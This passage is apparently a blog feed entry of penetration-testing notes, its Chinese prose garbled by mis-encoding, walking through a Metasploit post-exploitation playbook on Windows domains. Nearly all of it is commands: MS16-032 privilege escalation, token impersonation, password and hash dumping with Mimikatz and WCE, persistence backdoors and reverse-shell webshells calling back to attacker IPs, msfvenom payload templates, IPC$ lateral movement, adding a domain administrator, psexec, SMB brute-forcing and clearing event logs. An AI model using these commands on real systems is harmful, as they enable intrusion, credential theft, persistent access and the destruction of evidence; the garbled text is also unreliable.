1.åˆ©ç”¨WMICå®æˆ˜MS16-032æœ¬åœ°æº¢å‡ºæ¼æ´ # WMICæ˜¯winä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·(äº¤äº’æ¨¡å¼/éäº¤äº’æ¨¡å¼)ï¼Œä¸ä»…å¯ç®¡ç†æœ¬æœºè¿˜å¯ç®¡ç†åŸŸå†…æ‰€æœ‰è¿œç¨‹ä¸»æœº(å‰ææ˜¯æœ‰æƒé™)ï¼Œè€Œè¢«ç®¡ç†è€…ä¸éœ€è¦å®‰è£…WMIC # WMICåœ¨ä¿¡æ¯æœé›†å’Œåæ¸—é€ååˆ†æœ‰ç”¨ï¼Œå¯ä»¥è°ƒæŸ¥ç›®æ ‡æœºçš„è¿›ç¨‹ï¼ŒæœåŠ¡ï¼Œç”¨æˆ·ï¼Œç”¨æˆ·ç»„ï¼Œç½‘ç»œè¿æ¥ï¼Œç¡¬ç›˜ä¿¡æ¯ï¼Œæ—¶åŒºï¼Œæ“ä½œç³»ç»Ÿä¿¡æ¯ç­‰ # å‡è®¾æ‹¿åˆ°äº†Meterpreter shell getuid getsystem # å°è¯•ææƒï¼Œä½†æ˜¯å¤±è´¥ # æ¥ç€æŸ¥çœ‹ç³»ç»Ÿæ‰“äº†çš„è¡¥ä¸(ä¼ ç»Ÿæ–¹æ³•ï¼šåœ¨ç›®æ ‡cmdè¾“å…¥systeminfoï¼Œæˆ–æŸ¥è¯¢C:\windows\è¡¥ä¸å·.log) # è¿™é‡Œåˆ©ç”¨WMICå‘½ä»¤åˆ—å‡ºå®‰è£…çš„è¡¥ä¸ WMIC qfe get Caption,Description,HotFixID,IntalledOn # æ‰¾åˆ°æ‰“çš„è¡¥ä¸åï¼Œå»æ‰¾exp(ç„¶åå°†ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸ç¼–å·ä¸ææƒexpç¼–å·æ¯”å¯¹ï¼Œç„¶åä½¿ç”¨æ²¡æœ‰ç¼–å·çš„expè¿›è¡Œææƒ) ## æ¼æ´ä¿¡æ¯ç½‘ç«™ï¼š å®‰å…¨ç„¦ç‚¹ï¼Œ Expolit-DB # æ¥ä¸‹æ¥å‡†å¤‡ææƒ(æŠŠMeterpreteræ”¾åˆ°åå°ï¼šbackground), ç„¶åæœç´¢ms16-032 search ms16-032 # å¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯ä»¥è¯•è¯•å‡çº§ï¼šmsfupdate æˆ–è€…æ‰‹åŠ¨æ·»åŠ ç›¸åº”æ¼æ´EXP use exploit/windows/local/ms16_032_secondary_logon_handle_privsec set session 1 run # ä¼šè¿”å›ä¸€ä¸ªæ–°çš„sessionï¼Œè¿›å…¥ï¼Œæ‰§è¡Œgetuid åçœæ˜¯systemæƒé™äº† 2.ä»¤ç‰Œçªƒå–ä»¤ç‰Œ(Token)å°±æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥, ç›¸å½“ä¸è´¦æˆ·å¯†ç ï¼Œç‰¹ç‚¹æ˜¯éšæœºæ€§å’Œä¸å¯é¢„æµ‹åœ¨å‡å†’ä»¤ç‰Œæ”»å‡»ä¸­éœ€è¦ä½¿ç”¨Kerberosåè®®(ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå…¶è®¾è®¡ç›®çš„æ˜¯é€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·æœº/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„è®¤è¯æœåŠ¡)Kerberoså·¥ä½œæœºåˆ¶ï¼šxxxå¾…è¡¥å…… å‡å†’ä»¤ç‰Œå®æˆ˜åˆ©ç”¨ # å‡è®¾å·²ç»æ‹¿åˆ°äº†Meterpreter shell getuid getsystem # ææƒå¤±è´¥ use incognito list token -u # åˆ—å‡ºå¯ç”¨çš„token(ä¼šçœ‹åˆ°ç»“æœï¼Œæ ¹æ®Meterpreter shellçš„æƒé™è€Œå®š) # å‡è®¾ä»è¾“å‡ºä¿¡æ¯ä¸­çœ‹åˆ°äº†ç›®æ ‡æœºå™¨çš„..., ç»§ç»­åœ¨incognitoä¸­æ‰§è¡Œ impersonate_token WIN7-TEST\\Administrator # è°ƒç”¨incognitoä¸­çš„è¿™ä¸ªimpersonate_token å‘½ä»¤ï¼Œæ¥å‡å†’Adminè¿›è¡Œæ”»å‡»(æ³¨æ„æ˜¯ä¸¤ä¸ªåæ–œæ ) shell whoami # æŸ¥çœ‹æƒé™ Hashæ”»å‡» ###### 1.æ˜¯ä½¿ç”¨HashdumpæŠ“å–å¯†ç  hashdump # å¯¼å‡ºä¸»æœºçš„samæ•°æ®åº“çš„hash # å¦ä¸€ä¸ªæ›´å¼ºå¤§çš„æ¨¡å— run winsows/gather/smart_hashdump # è‹¥æ˜¯win7,ä¸”å¼€å¯äº†uacï¼Œå°±è¦ä½¿ç”¨ç»•è¿‡uacçš„æ¨¡å—å†ç»§ç»­ ##### 2.ä½¿ç”¨Quarks PwDumpæŠ“å–å¯†ç  win32ä¸‹çš„ä¸€æ¬¾å·¥å…·ï¼Œå¯¼å‡ºä¿¡æ¯ååˆ†å…¨é¢ï¼Œæ”¯æŒç³»ç»Ÿç‰ˆæœ¬ååˆ†å¹¿æ³› å…·ä½“å‚æ•°å†æŸ¥ QuarksPwDump.exe -dh1 -o 1.txt # è¿˜å¯é…åˆåœ¨ Ntdsutil å·¥å…·åˆ°å¤„DCçš„å¯†ç  ps: winçš„å¯†ç ä¼šåŠ å¯†å­˜æ”¾åœ¨/windows/system32/config/sam ##### 3.ä½¿ç”¨Windows Credentials EditoræŠ“å–å¯†ç  WCE(Windows Credentials Editor) åŠŸèƒ½å¼ºå¤§ï¼Œä¸è¿‡å¿…é¡»æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œè¿˜è¦ä¸»è¦å…æ€ # å…ˆä¸Šä¼ wceåˆ°ç›®æ ‡ upload wce.exe # åœ¨ç›®æ ‡çš„shellä¸‹æ‰§è¡Œ wce -w # ä¾¿ä¼šæˆåŠŸæå–æ˜æ–‡ç®¡ç†å‘˜å¯†ç (é»˜è®¤æ˜¯-lå‘½ä»¤è¯»å–ï¼Œ-få¼ºåˆ¶å®‰å…¨æ–¹å¼è¯»å–ï¼Œ-gç”¨æ¥è®¡ç®—å¯†ç ï¼Œ-cåˆ¶å®šä¼šè¯æ¥æ‰§è¡Œcmdï¼Œ-væ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œ-wæœ€å…³é”® --> æŸ¥çœ‹å·²ç™»å½•çš„æ˜æ–‡å¯†ç ) ##### 4.ä½¿ç”¨MimikatzæŠ“å–å¯†ç  msfå†…ç½®äº†Mimikatzæˆä¸ºä¸€ä¸ªpeterpreterè„šæœ¬é›†æˆ load Mimikatz help Mimikatz # mimikatz_command # å¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨Mimikatzå…¨éƒ¨åŠŸèƒ½, å¦‚(:: è¯·æ±‚æŸä¸ªæ¨¡å—å¯ç”¨çš„é€‰é¡¹) mimikatz_command -f hash:: mcv # æŠ“å–ç³»ç»Ÿhashå€¼ kerberos # æŠ“å–ç³»ç»Ÿç¥¨æ® wdigest # è·å–ç³»ç»Ÿè´¦æˆ·ä¿¡æ¯ mimikatz_command -f samdump::hash # æŠ“å–hash ## mimikatz é™¤äº†æŠ“å–hashï¼Œè¿˜æœ‰å…¶ä»–åŠŸèƒ½ï¼šæ¯”å¦‚ Handleæ¨¡å—ï¼Œlist\killè¿›ç¨‹ï¼Œæ¨¡æ‹Ÿç”¨æˆ·ä»¤ç‰Œç­‰ mimikatz_command -f handle:: mimikatz_command -f service:: # servviceæ¨¡å—å¯ä»¥å¯¹winçš„æœåŠ¡è¿›è¡Œ... mimikatz_command -f crypto:: # cryptoå¯ä»¥åˆ—å‡º å¯¼å‡ºä»»ä½•è¯ä¹¦ï¼Œä»¥åŠå­˜å‚¨åœ¨ç›®æ ‡æœºå™¨ä¸Šçš„ç›¸åº”çš„ç§é’¥ # mimikatz ä¹Ÿæ”¯æŒPowerShellè°ƒç”¨ è„šæœ¬P228 èƒ½åœ¨PowerShellä¸­æ‰§è¡Œmimikatzï¼Œå·çªƒå’Œæ³¨å…¥å‡­è¯ï¼Œä¼ªé€ Kerberoç¥¨è¯åˆ›å»ºï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šåŠŸèƒ½ åæ¸—é€æ”»å‡»ï¼šç§»æ¤æ¼æ´åˆ©ç”¨ä»£ç æ¨¡å—æ”¯æŒä¸åŒè¯­è¨€ç¼–å†™çš„æ¨¡å—ç§»æ¤è¿›å»ï¼Œå…è®¸å¼€å‘è€…å¼€å‘è‡ªå·±çš„æ¼æ´åˆ©ç”¨æ¨¡å— MS17-010 â€“&gt; å¾®è½¯SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¼”ç¤ºï¼šç§»æ¤MS17-010æ¼æ´åˆ©ç”¨ä»£ç  # MS17-010 åœ¨msfä¸­è™½ç„¶æœ‰é›†æˆè„šæœ¬ï¼Œä½†æ˜¯ä¸é€‚ç”¨äº03ç³»ç»Ÿï¼Œä»ç½‘ä¸Šè‡ªè¡Œä¸‹è½½ # cloneè„šæœ¬åˆ°æœ¬åœ°ï¼ŒæŠŠrbè„šæœ¬å¤åˆ¶åˆ°/usr/share/metasploit-framework/modules/exploits/windows/smbä¸‹ raload all # ç„¶ååœ¨msfä¸­é‡æ–°åŠ è½½è„šæœ¬ ä¹‹åå°±èƒ½searchåˆ°äº†ï¼Œç”¨useåŠ è½½å®ƒ # å¼€å§‹ msfovenom ç”Ÿæˆä¸€ä¸ªDLLæ–‡ä»¶(åœ¨ä¸‹é¢set payload) ç„¶åè®¾ç½®è¯¥æ¨¡å—çš„å‚æ•° run åæ¸—é€æ”»å‡»ï¼šåé—¨æå–å®Œæˆä¹‹åï¼Œå°±éœ€è¦ç•™åé—¨äº† 1.æ“ä½œç³»ç»Ÿåé—¨ ##### 1.Cymothoaåé—¨ å¯ä»¥å°†ShellCodeæ³¨å…¥åˆ°ç°æœ‰è¿›ç¨‹çš„åé—¨å·¥å…· è¯¥åé—¨èƒ½ä¸è¢«æ³¨å…¥è¿›ç¨‹å…±å­˜ï¼Œä¸”å¦‚æœä¸æ£€æŸ¥å†…å­˜æ˜¯å‘ç°ä¸äº†çš„ è¯¥åé—¨æ³¨å…¥ç³»ç»Ÿçš„æŸä¸€è¿›ç¨‹ï¼Œè¿”å›çš„æ˜¯è¯¥è¿›ç¨‹ç›¸åº”çš„æƒé™(å¹¶ä¸éœ€è¦root)ï¼Œ ä½†æ˜¯å…³é—­è¿›ç¨‹æˆ–é‡å¯ï¼Œåé—¨å°±ä¼šåœæ­¢è¿è¡Œ ps -aux # æŸ¥çœ‹ç¨‹åºçš„pidï¼Œ Winä¸‹æ˜¯ tasklist # -pæŒ‡å®šç›®æ ‡è¿›ç¨‹çš„PIDï¼Œ-yæŒ‡å®špayloadæœåŠ¡ç«¯å£ï¼Œ-sæŒ‡å®šShellCodeç¼–å·(cymothoa -S æŸ¥çœ‹) cymothoa -p 862 -s 1 -y 5555 # è¿æ¥åé—¨ nc -nvv 192.168.0.112 5555 ##### 2.Persistenceåé—¨ ä½¿ç”¨å®‰è£…è‡ªå¯åŠ¨æ–¹å¼çš„æŒç»­å‹åé—¨ï¼Œå¯ä»¥ç”¨å®ƒåˆ›å»ºæ³¨å†Œè¡¨å’Œæ–‡ä»¶ run persistence -h # æŸ¥çœ‹å‘½ä»¤é€‰é¡¹ # åˆ›å»ºæŒä¹…å‹åé—¨ run persistence -A -S -U -i 60 -p 4321 -r 162.168.0.112 # -Aè‡ªåŠ¨å¯åŠ¨payloadï¼Œ-Sç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½ï¼Œ-Uç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ï¼Œ -Xå¼€æœºæ—¶è‡ªåŠ¨åŠ è½½ï¼Œ-iå›è¿æ—¶é—´é—´éš”ï¼Œ-Pç›‘å¬ç«¯å£å·ï¼Œ -r ç›®æ ‡æœºå™¨åœ°å€ sessions # å‘ç°ä¼šè¯å·²æˆåŠŸè·å– 2.Webåé—¨(WebShell) # ä¸­å›½èœåˆ€ï¼ŒAntSwordï¼Œ Cknifeï¼Œ å†°èï¼ŒWeevely(kaliä½¿ç”¨æœ€å¤šï¼Œä½†æ˜¯åªæ”¯æŒphp)ï¼Œmsfä¹Ÿæœ‰è‡ªå¸¦çš„åé—¨ ##### 1. Meterpreter åé—¨ msfä¸­æœ‰ä¸€ä¸ªå« php meterpreter çš„payloadï¼Œé‡Œå“Ÿä½ ä»–å¯ä»¥åˆ›å»ºå…·æœ‰MeterpreteråŠŸèƒ½çš„php webshell # ä½¿ç”¨msfvenomåˆ›å»ºä¸€ä¸ªwebshell msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f raw > p.php # ä¸Šä¼ webshellåˆ°ç›®æ ‡æœºå™¨ # æœ¬æœºè¿è¡Œ msf multi-handler å¼€å§‹ç›‘å¬ use exploit/multi/handlers set payload php/meterpreter/reverse_tcp ... run # è®¿é—®webshellé¡µé¢ # è·å¾—åå¼¹çš„ Metasploit Shell ##### 2. Aspx Meterpreter åé—¨ msfä¸‹çš„ shell_reverse_tcp çš„payloadï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªç‰ˆæœ¬çš„å…·æœ‰meterpreteråŠŸèƒ½çš„Shellcode è¿™é‡Œä»¥aspxä¸ºä¾‹, æ­¥éª¤å’Œä¸Šé¢çš„é‚£ä¸ªå¤§è‡´ç›¸åŒ show payloads use windows/shell_reverse_tcp set ... save generate -h # æŸ¥çœ‹å¸®åŠ© generate -t aspx # ç”Ÿæˆaspxç‰ˆæœ¬çš„ShellCode # ä¿å­˜å†…å®¹åˆ°x.aspxï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ # æœ¬åœ°è®¾ç½®ç›‘å¬ use exploit/multi/handlers set payload windows/meterpreter/reverse_tcp ... run # è®¿é—®webshellé¡µé¢ # è·å¾—åå¼¹çš„ Metasploit Shell åç»­å°±å¯ä»¥è¿›è¡Œææƒç­‰æ“ä½œäº† msfåŸºç¡€å‘½ä»¤search ms17 # æŸ¥æ‰¾ use exploit/multi/handler # ä½¿ç”¨ info # æŸ¥çœ‹ä¿¡æ¯ show expoits/payloads/options # æ˜¾ç¤ºå¯ç”¨ä¿¡æ¯ exploit /run # æ‰§è¡Œ back # è¿”å›ä¸Šä¸€çº§ exploit -j # åå°è¿è¡Œ sessions # æŸ¥çœ‹å½“å‰å¯ç”¨ä¼šè¯ session -i 1 # è¿æ¥æŸä¸ªä¼šè¯ sessions -K # æ€æ­»æ‰€æœ‰æ´»è·ƒä¼šè¯ Meterpreterå‘½ä»¤ï¼šgetuid # æŸ¥çœ‹ç”¨æˆ·åï¼Œä»è€ŒæŸ¥çœ‹å½“å‰ä¼šè¯å…·æœ‰çš„æƒé™ sysinfo # åˆ—å‡ºä¸»æœºä¿¡æ¯ getprivs # å°½å¯èƒ½å¤šåœ°è·å–ç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹æƒ getystem # é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡åˆ°ç³»ç»Ÿç”¨æˆ·æƒé™ hashdump # å¯¼å‡ºç›®æ ‡ä¸»æœºä¸­çš„å£ä»¤å“ˆå¸Œå€¼ screenshot # å±å¹•æˆªå›¾ background # å°†å½“å‰çš„meterpreter shellè½¬ä¸ºåå°æ‰§è¡Œ quit # å…³é—­å½“å‰meterpreterä¼šè¯ï¼Œå›åˆ°msfç»ˆç«¯ ps # æ˜¾ç¤ºæ‰€æœ‰è¿è¡Œè¿›ç¨‹ migrate PID # è¿ç§»åˆ°åˆ¶å®šçš„è¿›ç¨‹PID execute -f cmd.exe -i # æ‰§è¡Œcmd.exeå‘½ä»¤å¹¶è¿›è¡Œäº¤äº’ shell # ä»¥æ‰€æœ‰å¯ç”¨ä»¤ç‰Œæ¥è¿›è¡Œä¸€ä¸ªäº¤äº’çš„shell msfvenomåŸºç¡€# å‚è€ƒï¼šmsfä¸‹çš„å„ç§ç”Ÿæˆpayloadå‘½ä»¤ http://www.cnblogs.com/backlion/p/6000544.html ### äºŒè¿›åˆ¶ # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf > shell.elf # Windows ç”Ÿæˆexeç¨‹åº msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f exe > shell.exe msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f exe -o /var/www/html/payload.exe # Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho > shell.macho ### Web Payloads # PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' > shell.php &amp;&amp; pbpaste >> shell.php # ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f asp > shell.asp # JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.jsp # WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war > shell.war ### Scripting Payloads # Python msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.py # Bash msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.sh # Perl msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.pl ### Shellcode: # Linux Based Shellcode msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> # Windows Based Shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> # Mac Based Shellcode msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> ### Handler use exploit/multi/handler set PAYLOAD &lt;Payload name> set LHOST &lt;LHOST value> set LPORT &lt;LPORT value> set ExitOnSession false exploit -j -z åå¼¹Shell### ç¬¬ä¸€ç§(è¿™ä¸ªç›‘å¬æ›´ç»¼åˆä¸€ç‚¹)ï¼š use exploit/multi/hander # 1.msfvenomç”Ÿæˆç¨‹åº # 2.ä½¿ç”¨handleræ‰§è¡Œexp # 3.åœ¨ç›®æ ‡æœºå™¨è¿è¡Œmsfvenomç”Ÿæˆç¨‹åº # 4.è¿”å›session ### ç¬¬äºŒç§ï¼š use exploit/multi/script/web_delivery # 1.ä½¿ç”¨web_deliveryè¿”å›è„šæœ¬æ‰§è¡Œå¹¶åŠ è½½exp # 2.åœ¨ç›®æ ‡æœºå™¨è¿è¡Œè„šæœ¬ # 3.è¿”å›session # Note: è¿™é‡Œè¦ä½¿ç”¨çš„payloadä¸ä¸Šé¢ä½¿ç”¨ç”Ÿæˆå™¨ç”Ÿæˆçš„åå­—è¦ä¸€è‡´ ä¸€äº›å°æ€è·¯ä¿¡æ¯æœé›†å½“æ‹¿ä¸‹ç¬¬ä¸€å¤©å†…ç½‘ä¸»æœºçš„æƒé™(ææƒä¸äº†æ—¶)ï¼Œå°±è¦ä»¥æ­¤æœåŠ¡å™¨ä¸ºè·³æ¿æ”»å‡»å…¶ä»–æœåŠ¡å™¨ å…ˆè¿›è¡Œç½‘ç»œ/ç”¨æˆ·ç»„/DCç­‰çš„æ”¶é›† è·å–å¦å¤–ä¸€å°æœåŠ¡å™¨æƒé™è‹¥æƒé™ä¸å¤Ÿå¯¼è‡´ä¸èƒ½ç›´æ¥æ”»å‡»åŸŸæœåŠ¡å™¨ ä½¿ç”¨meterpreterå½“å‰æ‹¥æœ‰çš„æƒé™æ·»åŠ åˆ°å†…ç½‘è·¯ç”±ï¼Œè¿›è¡Œå¼±å£ä»¤æ‰«æ ç”¨Powershellå¯¹å†…ç½‘è¿›è¡Œæ‰«æ æ¶è®¾Socks4a, ç„¶åsocksä¼šè‡ªåŠ¨è¿›è¡Œå†…ç½‘æ‰«æ åˆ©ç”¨å½“å‰æƒé™è¿›è¡Œå†…ç½‘IPC$æ¸—é€ å…¶ä»– é€šè¿‡åˆ†æï¼Œæˆ‘ä»¬è¾“å…¥net view, å‘ç°åˆ—ä¸¾çš„æœºå™¨é€‰æ‹©ä¸€ä¸ªå’Œæˆ‘ä»¬æœºå™¨åç›¸ä¼¼çš„æœåŠ¡å™¨è¯•ï¼ŒæˆåŠŸç‡ä¸€èˆ¬å¾ˆé«˜net use \\WIN7_TEST2\c$ ä½¿ç”¨ç»å…¸çš„IPC$å…¥ä¾µï¼ˆé€šè¿‡winé»˜è®¤å¯åŠ¨çš„ipcå…±äº«æ¥è·å¾—è®¡ç®—æœºæ§åˆ¶æƒï¼‰ï¼š net use \192.168.0.112\ipc$ # è¿æ¥è¿™ä¸ªipçš„ipcå…±äº« copy srv.exe \192.168.0.112\ipc$ # å¤åˆ¶srv(å…æ€çš„payload)åˆ°ç›®æ ‡ net time \192.168.0.112 # æŸ¥çœ‹æ—¶é—´ at \192.168.0.112 18:18 srv.exe # ç”¨atå‘½ä»¤åœ¨18ç‚¹18åˆ†å¯åŠ¨srv.exe (è¿™é‡Œè®¾ç½®çš„æ—¶é—´è¦æ¯”ä¸»æœºæ—¶é—´å¿«) # å¦‚æœæ²¡æœ‰ atå‘½ä»¤ï¼Œè¯•è¯•æ–°çš„è®¡åˆ’ä»»åŠ¡å‘½ä»¤ï¼š schtask # å›åˆ°msfçš„handlerè¿›è¡Œç›‘å¬ï¼Œåˆ°æ—¶é—´ä¼šåå¼¹shell ç„¶åè¿›å…¥è¿™ä¸ªæ–°çš„ä¸»æœºï¼ŒæŸ¥çœ‹åŒ…æ‹¬æƒé™åœ¨å†…çš„ä¿¡æ¯, ä¹Ÿå¯ä»¥mimikatzæŠ“å¯†ç : run /post/windows/gather/mimikatz ä¹Ÿå¯ä»¥ä¸Šä¼ å¯¹åº”ä½æ•°çš„mimikatzåˆ°è¯¥ä¸»æœº upload /home/x64.exe c:\ shell # è¿›å…¥åˆ°ç›®æ ‡çš„shellï¼Œå†æ‰§è¡Œ Powershellå¯»æ‰¾åŸŸç®¡åœ¨çº¿æœåŠ¡å™¨ä½¿ç”¨PowerViewè„šæœ¬çš„Invoke-User Hunterä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ï¼Œç„¶åæ‰§è¡ŒInvoke-UserHunter powershell.exe -exec bypass -Command "&amp;{Import-Module .powerview.ps1;Invoke-UserHunter}" æ‰¾åˆ°åŸŸç®¡ç†å‘˜å½“å‰åœ¨çº¿ç™»å½•çš„ä¸»æœºåï¼Œå…¥ä¾µè¯¥ä¸»æœºï¼Œç„¶åæŠŠå®ƒè¿ç§»åˆ°åŸŸç®¡ç†å‘˜ç™»å½•æ‰€åœ¨çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±æœ‰äº†åŸŸç®¡çš„ç†çš„æƒé™ è·å–åŸŸç®¡æƒé™æ¸—é€åŸŸæ§ # å…ˆå°è¯• getsystem getuid #æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼Œå› ä¸ºä¹‹å‰çŸ¥é“è¿™è´¦æˆ·çš„åŸŸç®¡ç†å‘˜ ps # æ‰¾åˆ°åŸŸç®¡ç†æ‰€åœ¨è¿›ç¨‹ migrate 30560 # è¿ç§»è¿›ç¨‹è¿‡å»(ä¹Ÿå¯ä»¥ç”¨msfä¸­çªƒå–ä»¤ç‰Œçš„åŠŸèƒ½) # æŸ¥çœ‹ä¸»åŸŸæ§çš„IP shell # å…ˆè¿›å»cmd net time # ä½¿ç”¨IPC$å…¥ä¾µæ¥è¿”å›ä¸€ä¸ªåŸŸæ§çš„meterpreter shell(æ“ä½œè§ä¸Šé¢çš„æ­¥éª¤) net user test test123 /ad /domain # æ·»åŠ åŸŸç®¡ç†å‘˜ net group "domain admins" /domain #æŸ¥çœ‹åŸŸç®¡ç†å‘˜æ˜¯å¦æ·»åŠ æˆåŠŸ ç™»å½•åŸŸæ§ä¸‹é¢è¦ç™»å½•åŸŸæ§ï¼ŒæŠ“å–hash å¸¸è§çš„ç™»å½•åŸŸæ§çš„æ–¹æ³•ï¼š - åˆ©ç”¨IPCä¸Šä¼ AT&amp;Achtasksè¿œç¨‹æ‰§è¡Œå‘½ä»¤ - åˆ©ç”¨ç«¯å£è½¬å‘æˆ–Socksç™»å½•DCçš„3389 - ç™»å½•å¯¹æ–¹å†…ç½‘ä¸€å°ä¸»æœºä½¿ç”¨PsToolså·¥å…·åŒ…ä¸­çš„PsExecæ¥åå¼¹shell - ä½¿ç”¨msfä¸‹çš„PsExecï¼Œpsexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexecç­‰PsExecç±»å·¥å…·åå¼¹shell - ä½¿ç”¨msfä¸‹çš„smb_loginåå¼¹shell - ä½¿ç”¨WMIæ¥è¿›è¡Œæ”»å‡» - ä½¿ç”¨PsRemoting posershelè¿œç¨‹æ‰§è¡Œå‘½ä»¤ - å…¶ä»– æœ€å¸¸è§çš„æ˜¯msfä¸‹çš„PsEcexåå¼¹meterpreter(1.msfä¸‹çš„PsEcexæ¨¡å— 2.cuestomæ¨¡å—,å»ºè®®ä½¿ç”¨Veilä¹‹ç±»çš„å·¥å…·æ¥ç”Ÿæˆå…æ€çš„payload) use /exploit/windows/smb/psexec set smbuser test set smbpass test123 set smbdomain HACKER set rhost 192.168.0.111 run # è·å¾—åå¼¹çš„meterpreter shellä¹‹åï¼Œå…ˆè¿ç§»è¿›ç¨‹ï¼ŒæŸ¥çœ‹DCçš„ç³»ç»Ÿç³»ç»Ÿå’Œsesssionæ§åˆ¶å›¾ ps migrate 2166 getuid sysinfo sessions # æŸ¥çœ‹æˆ‘ä»¬è·å–çš„sessions # æŠ“hashæ–¹æ³•ï¼š - msfè‡ªå¸¦çš„hashdump(æœ‰systemæƒé™æ‰å¯ä»¥)æˆ–smart_dumpæ¨¡å—å¯¼å‡ºç”¨æˆ·çš„Hash - ä½¿ç”¨PowerShellçš„ç›¸åº”æ¨¡å—å¯¼å‡ºhash - ä½¿ç”¨WCEã€Mimikatzç­‰å·¥å…· - å…¶ä»– SMBçˆ†ç ´å†…ç½‘æœ‰äº†DCçš„å¯†ç ï¼Œæ¥ä¸‹æ¥åªéœ€å¿«é€Ÿåœ¨å†…ç½‘æ‰©å¤§æ§åˆ¶æƒé™ åˆ©ç”¨å½“å‰è·å–çš„DCçš„è´¦æˆ·å¯†ç ï¼Œå¯¹æ•´ä¸ªåŸŸæ§çš„IPçŸ­è¿›è¡Œæ‰«æ ä½¿ç”¨SMBä¸‹çš„smb_loginæ¨¡å— ç«¯å£è½¬å‘æˆ–socksä»£ç†è¿›å†…ç½‘ ## å…ˆåœ¨msfæ·»åŠ è·¯ç”±ï¼Œç„¶åä½¿ç”¨smb_loginæ¨¡å—Huo psexec_Scanneræ¨¡å—è¿›è¡Œçˆ†ç ´ background route add 192.168.0.115 255.255.255.0 2 # ç›®çš„æ˜¯è®¿é—®1192.168.0.115å°†é€šè¿‡meterpreterçš„ä¼šè¯ 2 æ¥è®¿é—®ï¼š search smb_login use auxiliary/scanner/smb/smb_login set ... run # æ‰«æå†…ç½‘ creds # ç„¶åè·å¾—å¤§é‡å†…ç½‘æœåŠ¡å™¨çš„å¯†ç ï¼Œä¸‹é¢å°±å¯ä»¥ç•…æ¸¸å†…ç½‘äº† # å¯ä»¥ä½¿ç”¨Meterpreterçš„ç«¯å£è½¬å‘ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Metasploitä¸‹çš„Socks4aæ¨¡å—æˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶(è¿™é‡Œä½¿ç”¨ç®€å•çš„ç¬¬ä¸€ç§) portfwd add -l 5555 -p 3389 -r 127.0.0.1 background æ¸…ç†æ—¥å¿—æ­¥éª¤ åˆ é™¤ä¹‹å‰æ·»åŠ çš„åŸŸç®¡ç†å‘˜çš„å¸å· åˆ é™¤æ‰€æœ‰åœ¨æ¸—é€ä¸­ä½¿ç”¨çš„å·¥å…· åˆ é™¤åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå’Œå®‰å…¨æ—¥å¿— å…³é—­æ‰€æœ‰çš„Meterpreterè¿æ¥ net user test /dels clearev # åˆ é™¤æ—¥å¿— sessions sessions -K # å…³é—­æ‰€æœ‰msfè¿æ¥ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms-16075ææƒWindows Server 2008]]></title>
    <url>%2Fposts%2F29481%2F</url>
